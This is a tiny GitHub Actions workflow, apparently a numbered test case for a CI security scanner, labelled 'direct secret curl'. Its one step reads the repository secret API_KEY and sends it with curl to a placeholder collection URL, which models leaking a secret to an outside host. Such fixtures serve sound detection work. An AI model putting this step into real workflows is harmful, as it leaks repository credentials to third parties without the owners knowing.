name: B02-direct-secret-curl

on:
  workflow_dispatch

jobs:
  test:
    runs-on: ubuntu-latest

    env:
      API_KEY: ${{ secrets.API_KEY }}

    steps:
      - run:
          'curl -H "Authorization: Bearer $API_KEY" https://example.invalid/collect'